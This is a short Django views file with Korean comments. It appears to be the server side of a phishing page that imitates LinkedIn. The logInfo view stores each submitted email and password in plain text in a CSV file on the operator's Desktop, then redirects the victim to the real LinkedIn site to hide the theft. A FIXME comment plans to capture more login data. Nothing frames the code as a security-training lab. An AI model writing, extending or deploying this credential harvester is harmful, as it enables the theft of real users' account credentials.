from django.http import HttpResponse
from django.shortcuts import render
from django.http import HttpResponseRedirect
import csv
import json
import os
from datetime import datetime

def index(request):
    context = {}
    return render(request,'index.html', context)

def logInfo(request):
    if request.method == 'POST':
        email = request.POST.get('email')
        password = request.POST.get('password')
        now = datetime.now()
        result = {
            'email' : email,
            'password' : password,
            'parsingTime' : now.strftime("%Y-%m-%d %H:%M:%S")
            #FIXME, GYH, 추가로 남길 로그인 정보 추가
        }
        save_dict_to_csv(result)
    return HttpResponseRedirect("https://kr.linkedin.com/")
    # return render(request,'index.html')

def save_dict_to_csv(data: dict, filename: str = os.path.join(os.path.expanduser('~'), 'Desktop','django-project', 'result' , "output.csv")):
    if not isinstance(data, dict):
        raise ValueError("입력 데이터는 딕셔너리여야 합니다.")
    try:
        with open(filename, mode='a', newline='', encoding='utf-8') as file:
            writer = csv.writer(file)
            writer.writerow(data.keys())
            writer.writerow(data.values())
        print(f"[✓] CSV 파일 저장 완료: {filename}")
    except Exception as e:
        print(f"[✗] CSV 저장 중 오류 발생: {e}")
